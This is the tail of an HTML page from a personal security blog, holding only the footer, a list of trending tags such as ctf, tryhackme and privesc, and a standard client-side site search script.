class="mb-0"> © 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
